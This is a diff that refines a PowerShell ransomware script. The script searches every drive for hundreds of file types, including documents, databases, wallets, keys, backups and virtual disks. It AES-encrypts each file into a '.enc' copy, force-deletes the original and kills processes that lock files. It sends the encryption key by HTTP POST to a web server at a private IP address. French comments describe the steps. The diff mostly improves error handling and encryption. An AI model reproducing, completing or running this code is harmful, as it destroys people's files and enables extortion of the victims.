@@ -1,5 +1,5 @@
 function Get-Files($drive){
-    $files=gci "$($drive.Name)" -Recurse -Include *.contact,*.dbx,*.doc,*.docx,*.jnt,*.jpg,*.mapimail,*.msg,*.oab,*.ods,*.pdf,*.pps,*.ppsm,*.ppt,*.pptm,*.prf,*.pst,*.rar,*.rtf,*.txt,*.wab,*.xls,*.xlsx,*.xml,*.zip,*.1cd,*.3ds,*.3g2,*.3gp,*.7z,*.7zip,*.accdb,*.aoi,*.asf,*.asp,*.aspx,*.asx,*.avi,*.bak,*.cer,*.cfg,*.class,*.config,*.css,*.csv,*.db,*.dds,*.dwg,*.dxf,*.flf,*.flv,*.html,*.idx,*.js,*.key,*.kwm,*.laccdb,*.ldf,*.lit,*.m3u,*.mbx,*.md,*.mdf,*.mid,*.mlb,*.mov,*.mp3,*.mp4,*.mpg,*.obj,*.odt,*.pages,*.php,*.psd,*.pwm,*.rm,*.safe,*.sav,*.save,*.sql,*.srt,*.swf,*.thm,*.vob,*.wav,*.wma,*.wmv,*.xlsb,*.3dm,*.aac,*.ai,*.arw,*.c,*.cdr,*.cls,*.cpi,*.cpp,*.cs,*.db3,*.docm,*.dot,*.dotm,*.dotx,*.drw,*.dxb,*.eps,*.fla,*.flac,*.fxg,*.java,*.m,*.m4v,*.max,*.mdb,*.pcd,*.pct,*.pl,*.potm,*.potx,*.ppam,*.ppsm,*.ppsx,*.pptm,*.ps,*.pspimage,*.r3d,*.rw2,*.sldm,*.sldx,*.svg,*.tga,*.wps,*.xla,*.xlam,*.xlm,*.xlr,*.xlsm,*.xlt,*.xltm,*.xltx,*.xlw,*.act,*.adp,*.al,*.bkp,*.blend,*.cdf,*.cdx,*.cgm,*.cr2,*.crt,*.dac,*.dbf,*.dcr,*.ddd,*.design,*.dtd,*.fdb,*.fff,*.fpx,*.h,*.iif,*.indd,*.jpeg,*.mos,*.nd,*.nsd,*.nsf,*.nsg,*.nsh,*.odc,*.odp,*.oil,*.pas,*.pat,*.pef,*.pfx,*.ptx,*.qbb,*.qbm,*.sas7bdat,*.say,*.st4,*.st6,*.stc,*.sxc,*.sxw,*.tlg,*.wad,*.xlk,*.aiff,*.bin,*.bmp,*.cmt,*.dat,*.dit,*.edb,*.flvv,*.gif,*.groups,*.hdd,*.hpp,*.log,*.m2ts,*.m4p,*.mkv,*.mpeg,*.ndf,*.nvram,*.ogg,*.ost,*.pab,*.pdb,*.pif,*.png,*.qed,*.qcow,*.qcow2,*.rvt,*.st7,*.stm,*.vbox,*.vdi,*.vhd,*.vhdx,*.vmdk,*.vmsd,*.vmx,*.vmxf,*.3fr,*.3pr,*.ab4,*.accde,*.accdr,*.accdt,*.ach,*.acr,*.adb,*.ads,*.agdl,*.ait,*.apj,*.asm,*.awg,*.back,*.backup,*.backupdb,*.bank,*.bay,*.bdb,*.bgt,*.bik,*.bpw,*.cdr3,*.cdr4,*.cdr5,*.cdr6,*.cdrw,*.ce1,*.ce2,*.cib,*.craw,*.crw,*.csh,*.csl,*.db_journal,*.dc2,*.dcs,*.ddoc,*.ddrw,*.der,*.des,*.dgc,*.djvu,*.dng,*.drf,*.dxg,*.eml,*.erbsql,*.erf,*.exf,*.ffd,*.fh,*.fhd,*.gray,*.grey,*.gry,*.hbk,*.ibank,*.ibd,*.ibz,*.iiq,*.incpas,*.jpe,*.kc2,*.kdbx,*.kdc,*.kpdx,*.lua,*.mdc,*.mef,*.mfw,*.mmw,*.mny,*.moneywell,*.mrw,*.myd,*.ndd,*.nef,*.nk2,*.nop,*.nrw,*.ns2,*.ns3,*.ns4,*.nwb,*.nx2,*.nxl,*.nyf,*.odb,*.odf,*.odg,*.odm,*.orf,*.otg,*.oth,*.otp,*.ots,*.ott,*.p12,*.p7b,*.p7c,*.pdd,*.pem,*.plus_muhd,*.plc,*.pot,*.pptx,*.psafe3,*.py,*.qba,*.qbr,*.qbw,*.qbx,*.qby,*.raf,*.rat,*.raw,*.rdb,*.rwl,*.rwz,*.s3db,*.sd0,*.sda,*.sdf,*.sqlite,*.sqlite3,*.sqlitedb,*.sr2,*.srf,*.srw,*.st5,*.st8,*.std,*.sti,*.stw,*.stx,*.sxd,*.sxg,*.sxi,*.sxm,*.tex,*.wallet,*.wb2,*.wpd,*.x11,*.x3f,*.xis,*.ycbcra,*.yuv;
+    $files=gci "$($drive.Name)" -Recurse  -ErrorAction SilentlyContinue -Include *.contact,*.dbx,*.doc,*.docx,*.jnt,*.jpg,*.mapimail,*.msg,*.oab,*.ods,*.pdf,*.pps,*.ppsm,*.ppt,*.pptm,*.prf,*.pst,*.rar,*.rtf,*.txt,*.wab,*.xls,*.xlsx,*.xml,*.zip,*.1cd,*.3ds,*.3g2,*.3gp,*.7z,*.7zip,*.accdb,*.aoi,*.asf,*.asp,*.aspx,*.asx,*.avi,*.bak,*.cer,*.cfg,*.class,*.config,*.css,*.csv,*.db,*.dds,*.dwg,*.dxf,*.flf,*.flv,*.html,*.idx,*.js,*.key,*.kwm,*.laccdb,*.ldf,*.lit,*.m3u,*.mbx,*.md,*.mdf,*.mid,*.mlb,*.mov,*.mp3,*.mp4,*.mpg,*.obj,*.odt,*.pages,*.php,*.psd,*.pwm,*.rm,*.safe,*.sav,*.save,*.sql,*.srt,*.swf,*.thm,*.vob,*.wav,*.wma,*.wmv,*.xlsb,*.3dm,*.aac,*.ai,*.arw,*.c,*.cdr,*.cls,*.cpi,*.cpp,*.cs,*.db3,*.docm,*.dot,*.dotm,*.dotx,*.drw,*.dxb,*.eps,*.fla,*.flac,*.fxg,*.java,*.m,*.m4v,*.max,*.mdb,*.pcd,*.pct,*.pl,*.potm,*.potx,*.ppam,*.ppsm,*.ppsx,*.pptm,*.ps,*.pspimage,*.r3d,*.rw2,*.sldm,*.sldx,*.svg,*.tga,*.wps,*.xla,*.xlam,*.xlm,*.xlr,*.xlsm,*.xlt,*.xltm,*.xltx,*.xlw,*.act,*.adp,*.al,*.bkp,*.blend,*.cdf,*.cdx,*.cgm,*.cr2,*.crt,*.dac,*.dbf,*.dcr,*.ddd,*.design,*.dtd,*.fdb,*.fff,*.fpx,*.h,*.iif,*.indd,*.jpeg,*.mos,*.nd,*.nsd,*.nsf,*.nsg,*.nsh,*.odc,*.odp,*.oil,*.pas,*.pat,*.pef,*.pfx,*.ptx,*.qbb,*.qbm,*.sas7bdat,*.say,*.st4,*.st6,*.stc,*.sxc,*.sxw,*.tlg,*.wad,*.xlk,*.aiff,*.bin,*.bmp,*.cmt,*.dat,*.dit,*.edb,*.flvv,*.gif,*.groups,*.hdd,*.hpp,*.log,*.m2ts,*.m4p,*.mkv,*.mpeg,*.ndf,*.nvram,*.ogg,*.ost,*.pab,*.pdb,*.pif,*.png,*.qed,*.qcow,*.qcow2,*.rvt,*.st7,*.stm,*.vbox,*.vdi,*.vhd,*.vhdx,*.vmdk,*.vmsd,*.vmx,*.vmxf,*.3fr,*.3pr,*.ab4,*.accde,*.accdr,*.accdt,*.ach,*.acr,*.adb,*.ads,*.agdl,*.ait,*.apj,*.asm,*.awg,*.back,*.backup,*.backupdb,*.bank,*.bay,*.bdb,*.bgt,*.bik,*.bpw,*.cdr3,*.cdr4,*.cdr5,*.cdr6,*.cdrw,*.ce1,*.ce2,*.cib,*.craw,*.crw,*.csh,*.csl,*.db_journal,*.dc2,*.dcs,*.ddoc,*.ddrw,*.der,*.des,*.dgc,*.djvu,*.dng,*.drf,*.dxg,*.eml,*.erbsql,*.erf,*.exf,*.ffd,*.fh,*.fhd,*.gray,*.grey,*.gry,*.hbk,*.ibank,*.ibd,*.ibz,*.iiq,*.incpas,*.jpe,*.kc2,*.kdbx,*.kdc,*.kpdx,*.lua,*.mdc,*.mef,*.mfw,*.mmw,*.mny,*.moneywell,*.mrw,*.myd,*.ndd,*.nef,*.nk2,*.nop,*.nrw,*.ns2,*.ns3,*.ns4,*.nwb,*.nx2,*.nxl,*.nyf,*.odb,*.odf,*.odg,*.odm,*.orf,*.otg,*.oth,*.otp,*.ots,*.ott,*.p12,*.p7b,*.p7c,*.pdd,*.pem,*.plus_muhd,*.plc,*.pot,*.pptx,*.psafe3,*.py,*.qba,*.qbr,*.qbw,*.qbx,*.qby,*.raf,*.rat,*.raw,*.rdb,*.rwl,*.rwz,*.s3db,*.sd0,*.sda,*.sdf,*.sqlite,*.sqlite3,*.sqlitedb,*.sr2,*.srf,*.srw,*.st5,*.st8,*.std,*.sti,*.stw,*.stx,*.sxd,*.sxg,*.sxi,*.sxm,*.tex,*.wallet,*.wb2,*.wpd,*.x11,*.x3f,*.xis,*.ycbcra,*.yuv;
     return $files
 }
 
@@ -34,13 +34,10 @@ function Create-AesKey(){
     [System.Convert]::ToBase64String($aesManaged.Key)
 }
 
-function Encrypt-String ($key, $file){
+function Encrypt-String ($key, $file, $aesManaged, $encryptor){
     $bytes=[System.IO.File]::ReadAllBytes($file);
-    $aesManaged = Create-AesManagedObject $key
-    $encryptor = $aesManaged.CreateEncryptor()
     $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
     [byte[]] $fullData = $aesManaged.IV + $encryptedData
-    $aesManaged.Dispose()
     [System.Convert]::ToBase64String($fullData)
 }
 
@@ -63,17 +60,16 @@ function Get-All-Files($exts){
     return $files
 }
 
-function Not-Too-Big ($file, $key){
-    $erroractionPreference="stop"
+function Not-Too-Big ($file, $key, $aesManaged, $encryptor){
+    $erroractionPreference = "stop"
     try{
-        #$content = Get-Content -literalPath $file 
-        $encryptedcontent = Encrypt-String $key $file 
+        $encryptedcontent = Encrypt-String $key $file $aesManaged $encryptor
         Set-Content -Path $file'.enc' -Value $encryptedcontent
         Remove-Item –path $file -force
     }
     catch{
         try{
-            $encryptedcontent = Encrypt-String $key $file
+            $encryptedcontent = Encrypt-String $key $file $aesManaged $encryptor
             Get-Process | foreach{$processVar = $_;$_.Modules | foreach{if($_.FileName -eq $file){cmd /c taskkill /f /pid $processVar.id}}}
             Set-Content -Path $file'.enc' -Value $encryptedcontent
             Remove-Item –path $file -force
@@ -98,15 +94,15 @@ function Too-Big($file, $key){
 function Encrypt-All($key, $drive){
     $files = Get-Files $drive
     Foreach ($file in $files){
-        $toobig = ((Get-Item $file).length/1MB) -gt 30
+        $($file.FullName)
+        $toobig = ((Get-Item $($file.FullName)).length/1MB) -gt 30
         If ($toobig){
-            Too-Big $file $key
+            Too-Big $($file.FullName) $key
         }
 
         Else{
-            Not-Too-Big $file $key
+            Not-Too-Big $($file.FullName) $key
         }
-
     }
 }
 
@@ -189,11 +185,15 @@ function main{
     #Créée la clé AES
     $key = Create-AesKey
     #Envoie la clé AES à notre API Web
-    Invoke-WebRequest -Uri http://192.168.1.21:8080/ -Method POST -Body $key
-    #Pour l'instant on a pas l'API donc on la pose là 'C:\Users\ydgaygui\Desktop\key.aes'
-    Set-Content -Path 'C:\Users\ydgaygui\Desktop\key.aes' -Value $key
-    $ext = '*.txt'
+    try{
+        $ok = Invoke-WebRequest -Uri http://192.168.1.28:8080/ -Method POST -Body $key -UseBasicParsing
+    }
+    catch{}
+    #Initialisation de l'AES
+    $aesManaged = Create-AesManagedObject $key
+    $encryptor = $aesManaged.CreateEncryptor()
     foreach ($drive in $drives){
         Encrypt-All $key $drive
     }
+    $aesManaged.Dispose()
 }
